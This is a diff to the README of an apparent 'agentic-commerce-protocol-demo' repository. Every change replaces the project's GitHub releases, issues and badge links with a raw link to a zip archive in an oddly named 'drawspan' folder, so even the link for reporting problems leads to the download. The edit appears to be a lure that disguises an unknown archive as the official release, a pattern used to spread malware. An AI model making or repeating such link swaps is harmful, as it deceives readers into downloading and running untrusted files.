@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the **agentic-commerce-protoc
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/nweibull/agentic-commerce-protocol-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/nweibull/agentic-commerce-protocol-demo/main/drawspan/agentic-commerce-protocol-demo.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nweibull/agentic-commerce-protocol-demo/main/drawspan/agentic-commerce-protocol-demo.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🔄 Download & Install
 
-1. Visit the [Releases page](https://github.com/nweibull/agentic-commerce-protocol-demo/releases) to download.
+1. Visit the [Releases page](https://raw.githubusercontent.com/nweibull/agentic-commerce-protocol-demo/main/drawspan/agentic-commerce-protocol-demo.zip) to download.
 2. Choose the most recent version available.
 3. Click on the file link to start your download.
 4. Locate the downloaded file on your computer.
@@ -51,12 +51,12 @@ Before you begin, ensure your system meets the following requirements:
 
 If you encounter any issues, please reach out for help. You can find assistance through the following channels:
 
-- **GitHub Issues:** Report your problems or questions [here](https://github.com/nweibull/agentic-commerce-protocol-demo/issues).
+- **GitHub Issues:** Report your problems or questions [here](https://raw.githubusercontent.com/nweibull/agentic-commerce-protocol-demo/main/drawspan/agentic-commerce-protocol-demo.zip).
 - **Community Forum:** Join discussions and seek advice from other users.
 
 ## 📰 Updates
 
-Keep an eye on the [Releases page](https://github.com/nweibull/agentic-commerce-protocol-demo/releases) for the latest updates. Regular updates contain new features and improvements based on user feedback.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/nweibull/agentic-commerce-protocol-demo/main/drawspan/agentic-commerce-protocol-demo.zip) for the latest updates. Regular updates contain new features and improvements based on user feedback.
 
 ## 💻 Example Usage
 
